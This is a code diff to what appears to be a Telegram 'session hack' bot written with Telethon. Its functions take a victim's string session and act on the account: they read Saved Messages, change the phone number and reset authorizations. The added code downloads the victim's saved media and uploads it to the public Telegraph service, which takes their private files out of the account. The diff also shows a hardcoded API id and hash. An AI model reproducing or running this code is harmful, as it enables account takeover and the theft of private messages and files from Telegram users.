@@ -13,39 +13,39 @@ from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc
 from telethon.sessions import StringSession as ses
 from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions
+import telegraph
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
-from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
 bot = borg = tgbot
 
 Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
+
+
 async def savedmsgs(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        messages = []
-        async for message in X.iter_messages(None, from_user='me'):
-            msg_content = f"Message ID: {message.id}\n"
-            
-            if message.text:
-                msg_content += f"Text: {message.text}\n"
-            
-            if message.media:
-                if isinstance(message.media, MessageMediaPhoto):
-                    photo_url = message.media.photo.sizes[-1].url
-                    msg_content += f"Photo: {photo_url}\n"
-                elif isinstance(message.media, MessageMediaDocument):
-                    doc_url = message.media.document.url
-                    msg_content += f"Document: {doc_url}\n"
-                elif isinstance(message.media, MessageMediaWebPage):
-                    webpage_url = message.media.webpage.url
-                    msg_content += f"Webpage: {webpage_url}\n"
-                # Add more checks for other media types like gif, video, audio, etc.
-            
-            messages.append(msg_content)
+        try:
+            messages = []
+            async for x in X.iter_messages('me'):
+                if x.text:
+                    messages.append(x.text)
+                elif x.media:
+                    # Upload media to Telegraph and get the media link
+                    file_path = await x.download_media()
+                    telegraph_api = telegraph.Telegraph()
+                    response = telegraph_api.upload(file_path)
+                    media_link = response['src']
+                    messages.append(media_link)
 
-        return "\n\n".join(messages)
+            # Combine all messages into a single string
+            saved_messages = "\n\n".join(messages)
+            return saved_messages
+        except Exception as e:
+            print(e)
+            return "An error occurred while fetching saved messages."
 
+# Rest of the code remains the same
 
 async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
